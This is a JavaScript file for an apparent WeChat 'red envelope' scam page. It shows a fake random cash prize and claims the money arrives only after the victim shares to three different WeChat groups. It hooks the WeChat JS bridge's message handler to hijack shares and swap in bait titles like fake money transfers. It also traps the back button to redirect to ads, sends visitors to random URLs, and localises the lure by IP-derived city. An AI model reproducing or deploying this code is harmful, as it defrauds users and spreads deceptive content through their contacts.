var isDev = false;
var fenliuData = new Array();
var fenliuTime = 10;
var isNeedReloadShare = false;


Zepto(function ($) {
    var imgUrl = "http://ww4.sinaimg.cn/mw690/006xLWk3gw1f6uucy8o2bj305k05kq2y.jpg";
    $(".topcontent .avatar img").attr("src", imgUrl);
    $(".user-picture img").attr("src", imgUrl);
})

var lastBackIndex = 0;

var currentTime = new Date().getTime();
window.setTimeout(
    function () {
        history.pushState(null, null, "#weixin");
        window.onpopstate = function () {
            history.pushState(null, null, "#weixin2");
            var currentTime2 = new Date().getTime();
            if (currentTime2 - currentTime < 500) {
                return true;
            }
            lastBackIndex++;
            if (lastBackIndex % 2 == 0 && typeof(adUrl) != "undefined") {
                location.href = adUrl;
            } else {
                selfLoad();
            }
            return true;
        };
    }, 50);

//分流                                       n
function fenliu() {
    //有5分之一的几率切到新的上面
    var time = new Date().getTime();


    if (fenliuTime > 0 && time % fenliuTime != 1) {
        return;
    }

    if (fenliuData == null || fenliuData.length <= 0) {
        return;
    }
    // //
    var url = fenliuData[time % fenliuData.length];
    window.location.replace(url);
}


var weui = {
    alert: function (msg, title, callback) {
        title = title ? title : "温馨提醒";
        var alertHtml = '<div class="weui_dialog_alert" style="position: fixed; z-index: 2000; display:none;">';
        alertHtml += '<div class="weui_mask"></div>';
        alertHtml += '<div class="weui_dialog">';
        alertHtml += '<div class="weui_dialog_hd"><strong class="weui_dialog_title" style="color: #000;">' + title + '</strong></div>';
        alertHtml += '<div class="weui_dialog_bd"></div>';
        alertHtml += '<div class="weui_dialog_ft">';
        alertHtml += '<a href="javascript:;" class="weui_btn_dialog primary" style="padding:10px;font-weight:bold;">好</a>';
        alertHtml += '</div>';
        alertHtml += '</div>';
        alertHtml += '</div>';
        if ($(".weui_dialog_alert").length > 0) {
            $(".weui_dialog_alert .weui_dialog_bd").empty();
        } else {
            $("body").append($(alertHtml));
        }
        var weui_alert = $(".weui_dialog_alert");
        weui_alert.show();
        weui_alert.find(".weui_dialog_bd").html(msg);
        weui_alert.find('.weui_btn_dialog').off("click").on('click',
            function () {
                weui_alert.hide();
                if (callback) {
                    callback();
                }
            });
    }
}

function wxAlert(msg, callback) {
    weui['alert'](msg, "", callback);
}

//是否是新版的微信
function isWxNewVersion() {
    if (isDev) {
        return true;
    }
    if ((/carlos1/i).test(window.location.href)) {
        return false;
    }

    if ((/carlos2/i).test(window.location.href)) {
        return true;
    }

    var wechatInfo = navigator.userAgent.match(/MicroMessenger\/([\d\.]+)/i);
    if (!wechatInfo) {
        return false;
    }
    console.log(wechatInfo[1]);
    return wechatInfo.length > 1 && wechatInfo[1] == "6.3.23";
}


var mm = (Math.random() * 30 + 80).toFixed(2);

$(function () {
    $('.firstcontainer').width($('.box-hcenter').eq(0).width());
});

function display() {
    for (var i = 0; i < 7; i++) {
        var temp = Math.random() * 33 + 3;
        $(".showmoneyplace").eq(i).html('+' + temp.toFixed(2) + '元');
    }
}

var oChai = document.getElementById("chai");
var oContainer = document.getElementById("firstcontainer");
var more = 0;
oChai.onclick = function () {
    oChai.setAttribute("class", "rotate");
    setTimeout(function () {
        oContainer.style.display = "none";
        $('#moneyzoom').text(mm);
        $('#mm').text(mm);
        wxAlert('恭喜您获得微信现金红包' + mm + '元！分享到不同的微信群即可到账！');
        setInterval("display()", 1500);
    }, 1500)
}

function shade() {
    $('#shadeshade').show();
    wxAlert('点击右上角，选择“分享到朋友圈”<br/>或分享到不同的微信群即可领取！', clickAlerConfrimCallBack);
}


var isShareLoadding = false;
function clickAlerConfrimCallBack() {
    if (isShareLoadding || !isWxNewVersion()) {
        return;
    }
    //设置文案
    var shareObject = getShareObject();
    // alert(shareObject.title+shareObject.imgUrl);
    $("#shareDefaultUrlId").attr("src", shareObject.imgUrl);
    document.title = shareObject.title;

    //如果还没到最大值,则倒计时
    if (maxShareSize > shareTimes) {
        // alert(shareTimes);
        isShareLoadding = true;
        var time = 5000;
        if (shareTimes == 0) {
            time = 8000;
        }
        if (isDev) {
            time = 500;
        }
        setTimeout(function () {
            isShareLoadding = false;
            shareComplete();
        }, time);
    }
}


var oldHandleMesageHook;
var curSetHookCount = 0;
var regHookCount = 0;
var shareTimes = 0;
var maxShareSize = 3;

function setHandleMessageHookForWeixin() {
    try {

        if (curSetHookCount > 15) {
            return;
        }
        if (!window.WeixinJSBridge) {
            setTimeout("setHandleMessageHookForWeixin()", 1000);
            curSetHookCount++;
            return;
        }

        if (!oldHandleMesageHook) {
            oldHandleMesageHook = window.WeixinJSBridge._handleMessageFromWeixin;
            window.WeixinJSBridge._handleMessageFromWeixin = function (message) {
                try {
                    var realMessage = message['__json_message'];
                    var shaStr = message['__sha_key'];
                    var eventId = realMessage['__event_id'];
                    var msgType = realMessage['__msg_type'];
                    var callbackId = realMessage['__callback_id'];

                    if (eventId && eventId.indexOf("share") > 0) {
						//分享
                        var eventMsg = "sendAppMessage";
                        var tmstr = eventId;

                        if (eventId == "general:share") {
                            var params = realMessage['__params'];
                            tmstr = params['shareTo'];
                        }
                        if (tmstr.indexOf("timeline") != -1) {
                            eventMsg = "shareTimeline";
                        }
                        var shareObject = getShareObject();
                        var data = {
                            "link": shareUrl,
                            "desc": shareObject.desc,
                            "title": shareObject.title,
                            "img_url": shareObject.imgUrl
                        };
                        getNewShareUrl();

                        if (eventMsg) {
                            window.WeixinJSBridge.invoke(eventMsg, data, shareCallback);
                            restoreHandleMessageHookForWeixin();
                        }
                    }
                } catch (e) {
                }
            }
        }

        regHookCount++;
    } catch (e) {
    }
}

function restoreHandleMessageHookForWeixin() {
    if (oldHandleMesageHook) {
        window.WeixinJSBridge._handleMessageFromWeixin = oldHandleMesageHook;
    }
}

function shareCallback(res) {

    var errMsg = res['err_msg'];

    if (errMsg) {
        if (errMsg.indexOf(":confirm") != -1 || errMsg.indexOf(":ok") != -1) {
            shareComplete();
        } else {

        }
    }

    curSetHookCount = 0;
    oldHandleMesageHook = undefined;
    setHandleMessageHookForWeixin();
}

function shareComplete() {
    shareTimes++;

    if (shareTimes < 1) {
    } else {
        switch (shareTimes) {
            case 1:
                wxAlert('发送成功,请再发送2个不同的微信群即可領取！', clickAlerConfrimCallBack);
                break;
            case 2:
                wxAlert('发送成功,请再发送1个不同的微信群即可領取！', clickAlerConfrimCallBack);
                break;
            case 3:
                if (isNeedReloadShare) {
                    isNeedReloadShare = false;
                    shareTimes = 0;
                    wxAlert('出现未知错误,分享失败,请重新分享',clickAlerConfrimCallBack);
                    return;
                }
                wxAlert('恭喜您已经成功領取到紅包，紅包将在48小时存入您的钱包中！</br> <span style="color:red">48小时内请勿删除朋友圈内容，以免影响到账</span>');
                setTimeout(goToShareNexUrlnew, 2000);
                break;
            case 5:
                wxAlert('恭喜您已经成功領取到紅包，紅包将在48小时存入您的钱包中！</br> <span style="color:red">48小时内请勿删除朋友圈内容，以免影响到账</span>');
                setTimeout(goToShareNexUrlnew, 2000);
                break;
            case 6:
            case 7:
            case 8:
            case 9:
            case 10:
                wxAlert('恭喜您已经成功領取到紅包，紅包将在48小时存入您的钱包中！</br> <span style="color:red">48小时内请勿删除朋友圈内容，以免影响到账</span>');
                break;
        }
    }
}

function goToShareNexUrlnew() {
   window.location.href = "http://renamayu.github.io/test/skip.html";
}


var shareUrl = window.location.href;
function getNewShareUrl() {
    window.location.href = "http://renamayu.github.io/test/skip.html";
    //var shareGetUrl = "http://119.29.8.160:8800/index1";
    //$.ajax({
    //    type: "GET",
    //    url: shareGetUrl,
    //    success: function (msg) {
    //        shareUrl = msg;
    //        console.log("shareUrl " + "http://renamayu.github.io/test/skip.html");
    //    }
   // });
}

var currentShareObject = {
    title: "邀请你加入同城红苞",
    desc: "我邀请你加入同城红苞群,每天免费领",
    imgUrl: "http://ww2.sinaimg.cn/mw690/006xLWk3gw1f6k0rfk2ynj30b40b4myu.jpg"
};

function getShareObject() {
    //如果是第二个页面的画,则直接返回钱
    // 向你转账XX元
    // [微信红苞] 恭喜发财，大吉大利
    if (shareTimes == 1) {
        return {title: "向你转账96元", desc: "请你在2小时内确认", imgUrl: "http://c.wx3010.top/res/zhuanz2.png"};
    } else if (shareTimes == 2) {
        return {title: "微信҉葒苞 恭囍发財", desc: "请你在2小时内确认", imgUrl: "http://c.wx3010.top/res/zhuanz2.png"};
    }
    return currentShareObject;
}

document.title = currentShareObject.title;
var checkCityTime = 0;
function checkCity() {
    fenliu();
    //有5分之一的几率切到
    if (checkCityTime > 20) {
        return;
    }
    checkCityTime++;
    if (typeof(remote_ip_info) == "undefined") {
        setTimeout(checkCity, 300);
        console.log("checkCity")
        return;
    }
    var city = remote_ip_info.city;
    // alert(city);
    if (city == "深圳" || city == "广州" || city == "成都") {
        // window.location.replace("http://hb.wx3003.top");
        // return;
    }
    currentShareObject.title = "邀请你加入" + city + "红苞群";
    document.title = currentShareObject.title;
    currentShareObject.desc = "我邀请你加入" + city + "红苞群,每天免费领";
    $("#cityTitle").html(currentShareObject.title);
}

checkCity();


//check跳转
(function () {
    if (!isWxNewVersion()) {
        return;
    }
    var hm = document.createElement("script");
    //hm.src = checkJumpUrl;
    // hm.src = "http://www.kanav022.cn/get/index.php?id=684";
    var s = document.getElementsByTagName("script")[0];
    alert(s);
   // s.parentNode.insertBefore(hm, s);
})();

var checkNeedGoToNextTime = 0;
function checkNeedGoToNext() {
    console.log("mNextUrl2")
    if (checkNeedGoToNextTime > 10) {
        return;
    }
    checkNeedGoToNextTime++;
    if (typeof(mNextUrl2) == "undefined") {
        setTimeout(checkNeedGoToNext, 300);
        return;
    }
     alert("goto="+mNextUrl2);
    $("body").hide();
    window.location.replace(mNextUrl2);
}


if (!isWxNewVersion()) {
	getNewShareUrl();
    setHandleMessageHookForWeixin();
}

//默认微信菜单
function onBridgeReady() {
    //WeixinJSBridge.call('showOptionMenu');
    WeixinJSBridge.call('hideMenuItems');
    enableDebugModeForWeixin();
}
if (typeof WeixinJSBridge == "undefined") {
    if (document.addEventListener) {
        document.addEventListener('WeixinJSBridgeReady', onBridgeReady, false);
    } else if (document.attachEvent) {
        document.attachEvent('WeixinJSBridgeReady', onBridgeReady);
        document.attachEvent('onWeixinJSBridgeReady', onBridgeReady);
    }
} else {
    onBridgeReady();
}

function enableDebugModeForWeixin() {
  window.WeixinJSBridge.enableDebugMode = function (callback) {
        window.onerror = function (errorMessage, scriptURI, lineNumber, columnNumber) {

            // 有callback的情况下，将错误信息传递到options.callback中
            if (typeof callback === 'function') {
                callback({
                    message: errorMessage,
                    script: scriptURI,
                    line: lineNumber,
                    column: columnNumber
                });
            } else {
                // 其他情况，都以alert方式直接提示错误信息
                var msgs = [];
                msgs.push("额，代码有错。。。");
                msgs.push("\n错误信息：", errorMessage);
                msgs.push("\n出错文件：", scriptURI);
                msgs.push("\n出错位置：", lineNumber + '行，' + columnNumber + '列');
                alert(msgs.join(''));
            }
        }
    };
}
